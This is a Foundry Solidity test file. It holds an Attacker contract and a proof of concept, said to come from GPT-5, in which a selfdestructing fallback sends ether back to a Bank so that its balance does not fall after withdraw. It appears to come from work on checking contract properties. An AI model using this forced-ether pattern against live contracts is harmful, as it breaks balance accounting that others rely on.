// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Bank} from "../src/Bank_v9.sol";

contract Attacker {
    Bank b;
    constructor(Bank _b) { b = _b; }
    function attack(uint256 value) public { b.withdraw(value); }                // function attack() is never used in the test
    fallback() external payable { selfdestruct(payable(address(b))); }
}

contract BankTest is Test {

    Bank public b;

    function setUp() public {
    }

    // withdraw-contract-balance:
    // after a non-reverting withdraw(amount),
    // the contract balance is decreased by amount wei.

    // PoC produced by GPT-5:
    // - Deploy Bank.
    // - Deploy an Attacker contract with:
    //      - fallback() external payable { selfdestruct(payable(address(bank))); }
    //      - a function to call bank.withdraw.
    // - Attacker first calls bank.deposit{value: 1 ether}(),
    //  so Bank’s balance is 1 ether and credits[Attacker] = 1 ether.
    // - Attacker calls bank.withdraw(1 ether).
    // Bank sends 1 ether to Attacker;
    // Attacker’s fallback runs and selfdestructs, sending that 1 ether back to Bank.
    // - withdraw succeeds.
    // Before withdraw: Bank balance = 1 ether.
    // After withdraw: Bank balance = 1 ether, i.e., not decreased by amount.



    function test_withdraw_contract_balance() public {
        // owner deploys the Bank contract
        address owner = address(123);
        vm.prank(owner);
        b = new Bank();

        Attacker A = new Attacker(b);
        vm.deal(address(A), 1 ether);

        vm.startPrank(address(A));
        b.deposit{value: 1 ether}();

        // Make sure that Bank’s balance is 1 ether and credits[A] = 1 ether.
        uint bank_balance_before = address(b).balance;                            // Storing bank's balance after the deposit
        assert(bank_balance_before == 1 ether);


        bytes32 slot = keccak256(abi.encode(address(A), uint256(1)));
        uint A_credits = uint256(vm.load(address(b), slot));            // Credits of A after the deposit
        assert(A_credits == 1 ether);

        // Ensuring withdraw() succeeds
        (bool success,) = address(b).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
        assert(success);                                                        


        uint bank_balance_after = address(b).balance;                            // Storing bank's balance after the withdraw
        
        
        // after a non-reverting withdraw(amount),
        // the contract balance is NOT decreased by amount wei.
        // After withdraw: Bank balance = 1 ether
        assert(bank_balance_after == bank_balance_before);
        vm.stopPrank();
    }

}